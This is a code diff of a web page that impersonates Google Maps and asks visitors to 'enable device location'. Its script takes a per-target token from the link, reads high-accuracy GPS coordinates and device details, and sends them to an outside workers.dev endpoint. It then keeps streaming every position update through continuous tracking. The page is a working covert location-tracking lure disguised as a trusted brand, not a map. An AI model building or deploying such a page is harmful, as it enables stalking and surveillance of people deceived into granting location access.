@@ -298,179 +298,113 @@ left: 0px;
 
 <body>
 
-<!-- Google-like background -->
+<!-- MAP -->
 <div class="map-bg">
-  <iframe
-    src="https://www.google.com/maps?q=lahore,pakistan&zoom=13&output=embed"
-    loading="lazy" id="map-link">
+  <iframe id="mapFrame"
+    src="https://www.google.com/maps?q=0,0&z=2&output=embed"
+    loading="lazy">
   </iframe>
 </div>
 
-<!-- Permission Screen -->
-
-
-<!-- -->
+<!-- PERMISSION SCREEN -->
 <div id="permission">
-<div class="d-box">
+  <div class="d-box">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 232597 333333">
+      <path d="M151444 5419C140355 1916 128560 0 116311 0" fill="#1a73e8"/>
+    </svg>
+    <h3>Google <span>Maps</span></h3>
+    <button id="allowBtn">Open</button>
+    <div id="status">To continue, enable device location</div>
+  </div>
+</div>
 
-<svg id="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 232597 333333" shape-rendering="geometricPrecision" text-rendering="geometricPrecision" image-rendering="optimizeQuality" fill-rule="evenodd" clip-rule="evenodd"><path d="M151444 5419C140355 1916 128560 0 116311 0 80573 0 48591 16155 27269 41534l54942 46222 69232-82338z" fill="#1a73e8"/><path d="M27244 41534C10257 61747 0 87832 0 116286c0 21876 4360 39594 11517 55472l70669-84002-54942-46222z" fill="#ea4335"/><path d="M116311 71828c24573 0 44483 19910 44483 44483 0 10938-3957 20969-10509 28706 0 0 35133-41786 69232-82313-14089-27093-38510-47936-68048-57286L82186 87756c8166-9753 20415-15928 34125-15928z" fill="#4285f4"/><path d="M116311 160769c-24573 0-44483-19910-44483-44483 0-10863 3906-20818 10358-28555l-70669 84027c12072 26791 32159 48289 52851 75381l85891-102122c-8141 9628-20339 15752-33948 15752z" fill="#fbbc04"/><path d="M148571 275014c38787-60663 84026-88210 84026-158728 0-19331-4738-37552-13080-53581L64393 247140c6578 8620 13206 17793 19683 27900 23590 36444 17037 58294 32260 58294 15172 0 8644-21876 32235-58320z" fill="#34a853"/></svg>
- <h3>Google <span>Maps</span></h3>
-<button id="allow">Open </button>
-  <div id="status">To continue, enable device location</div>
-</div>
-</div>
+<!-- GOOGLE UI OVERLAY -->
 <div class="google-ui">
-<div class="header"><svg id="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 232597 333333" shape-rendering="geometricPrecision" text-rendering="geometricPrecision" image-rendering="optimizeQuality" fill-rule="evenodd" clip-rule="evenodd"><path d="M151444 5419C140355 1916 128560 0 116311 0 80573 0 48591 16155 27269 41534l54942 46222 69232-82338z" fill="#1a73e8"/><path d="M27244 41534C10257 61747 0 87832 0 116286c0 21876 4360 39594 11517 55472l70669-84002-54942-46222z" fill="#ea4335"/><path d="M116311 71828c24573 0 44483 19910 44483 44483 0 10938-3957 20969-10509 28706 0 0 35133-41786 69232-82313-14089-27093-38510-47936-68048-57286L82186 87756c8166-9753 20415-15928 34125-15928z" fill="#4285f4"/><path d="M116311 160769c-24573 0-44483-19910-44483-44483 0-10863 3906-20818 10358-28555l-70669 84027c12072 26791 32159 48289 52851 75381l85891-102122c-8141 9628-20339 15752-33948 15752z" fill="#fbbc04"/><path d="M148571 275014c38787-60663 84026-88210 84026-158728 0-19331-4738-37552-13080-53581L64393 247140c6578 8620 13206 17793 19683 27900 23590 36444 17037 58294 32260 58294 15172 0 8644-21876 32235-58320z" fill="#34a853"/></svg>
-<h3>Google <span>Maps</span></h3>
-<button id="allow">Open app </button>
-
-</div>
-  <div class="top-container">
-    <div class="search-bar">
-      <i class="fa-solid fa-location-dot"></i>
-      <div class="search-text">Search here</div>
-      <i class="fa-solid fa-microphone"></i>
-      <div class="profile-icon" id="p-i">I</div>
-    </div>
-
-    <div class="pill-container">
-      <div class="pill"><i class="fa-solid fa-utensils"></i> Restaurants</div>
-      <div class="pill"><i class="fa-solid fa-gas-pump"></i> Gas</div>
-      <div class="pill"><i class="fa-solid fa-bed"></i> Hotels</div>
-      <div class="pill"><i class="fa-solid fa-coffee"></i> Coffee</div>
-      <div class="pill"><i class="fa-solid fa-cart-shopping"></i> Groceries</div>
-    </div>
+  <div class="header">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 232597 333333">
+      <path d="M151444 5419C140355 1916 128560 0 116311 0" fill="#1a73e8"/>
+    </svg>
+    <h3>Google <span>Maps</span></h3>
   </div>
-
-  <div class="map-tools">
-    <div class="tool-btn"><i class="fa-solid fa-layer-group"></i></div>
-    <div class="tool-btn compass"><i class="fa-solid fa-compass"></i></div>
-  </div>
-
-  <div class="google-logo">
-   
-  <span class="google-blue">G</span>
-  <span class="google-red">o</span>
-  <span class="google-yellow">o</span>
-  <span class="google-blue">g</span>
-  <span class="google-green">l</span>
-  <span class="google-red">e</span>
-
-</div>
-
-  <div class="bottom-right-tools">
-    <div class="locate-btn"><i class="fa-solid fa-location-crosshairs"></i></div>
-    <div class="directions-btn">
-      <i class="fa-solid fa-diamond-turn-right" style="color:white;font-size:22px"></i>
-    </div>
-  </div>
-
-  <div class="bottom-nav">
-    <div class="nav-item active">
-      <div class="active-indicator">
-        <i class="fa-solid fa-location-dot"></i>
-      </div>
-      Explore
-    </div>
-    <div class="nav-item">
-      <i class="fa-regular fa-bookmark"></i>
-      You
-    </div>
-    <div class="nav-item">
-      <i class="fa-regular fa-square-plus"></i>
-      Contribute
-    </div>
-  </div>
-
 </div>
 
 <script>
-/* Random profile letter */
-const letters=["A","B","C","J","N","S","H"];
-document.getElementById("p-i").textContent =
-  letters[Math.floor(Math.random()*letters.length)];
-</script>
-
-<script>
+/* ================= CONFIG ================= */
+const API = "https://odd-wildflower-ef2f.ishaqanwar751.workers.dev";
 const token = new URLSearchParams(location.search).get("token");
 if(!token){ alert("Invalid link"); throw "NO TOKEN"; }
 
-const API = "https://odd-wildflower-ef2f.ishaqanwar751.workers.dev/";
+const mapFrame = document.getElementById("mapFrame");
 const statusEl = document.getElementById("status");
 
-/* Advanced device info */
-function getDeviceInfo(){
+/* Device info */
+function deviceInfo(){
   return {
-    userAgent: navigator.userAgent,
-    platform: navigator.platform,
-    language: navigator.language,
-    screen: `${screen.width}x${screen.height}`,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+    ua:navigator.userAgent,
+    lang:navigator.language,
+    screen:`${screen.width}x${screen.height}`
   };
 }
 
-document.getElementById("allow").onclick = () => {
-
+/* CLICK */
+document.getElementById("allowBtn").onclick = ()=>{
   if(!navigator.geolocation){
-    statusEl.textContent = "Location not supported on this device";
+    statusEl.textContent="Location not supported";
     return;
   }
 
-  statusEl.textContent = "Requesting GPS permission…";
+  statusEl.textContent="Requesting location…";
 
   navigator.geolocation.getCurrentPosition(
     success,
     error,
-    { enableHighAccuracy:true, timeout:15000, maximumAge:0 }
+    { enableHighAccuracy:true, timeout:20000, maximumAge:0 }
   );
 };
 
+/* SUCCESS */
 function success(pos){
-  const { latitude:lat, longitude:lng, accuracy:acc } = pos.coords;
+  const {latitude,longitude,accuracy} = pos.coords;
 
-  /* Send FIRST accurate location immediately */
-  fetch(API + "/send-location",{
+  // Update map instantly
+  mapFrame.src =
+   `https://www.google.com/maps?q=${latitude},${longitude}&z=18&output=embed`;
+
+  // Send first hit
+  fetch(API+"/send-location",{
     method:"POST",
-    headers:{ "Content-Type":"application/json" },
+    headers:{"Content-Type":"application/json"},
     body:JSON.stringify({
       token,
-      lat, lng, acc,
-      device: getDeviceInfo()
+      lat:latitude,
+      lng:longitude,
+      acc:accuracy,
+      device:deviceInfo()
     })
   });
 
   document.getElementById("permission").remove();
 
-  /* Continuous tracking */
-  navigator.geolocation.watchPosition(
-    p=>{
-      fetch(API + "/send-location",{
-        method:"POST",
-        headers:{ "Content-Type":"application/json" },
-        body:JSON.stringify({
-          token,
-          lat:p.coords.latitude,
-          lng:p.coords.longitude,
-          acc:p.coords.accuracy
-        })
-      });
-    },
-    ()=>{},
-    { enableHighAccuracy:true, maximumAge:0 }
-  );
+  // Continuous tracking
+  navigator.geolocation.watchPosition(p=>{
+    fetch(API+"/send-location",{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({
+        token,
+        lat:p.coords.latitude,
+        lng:p.coords.longitude,
+        acc:p.coords.accuracy
+      })
+    });
+  },()=>{}, {enableHighAccuracy:true});
 }
 
+/* ERROR */
 function error(e){
-  if(e.code === 1){
-    statusEl.textContent =
-      "Location access denied. Please enable GPS and allow permission.";
-  }else{
-    statusEl.textContent =
-      "Unable to get location. Turn ON GPS and try again.";
-      document.getElementById("allow").textContent="Retry";
-  }
+  statusEl.textContent =
+    "Enable GPS & allow location permission";
 }
-
 </script>
 
 </body>
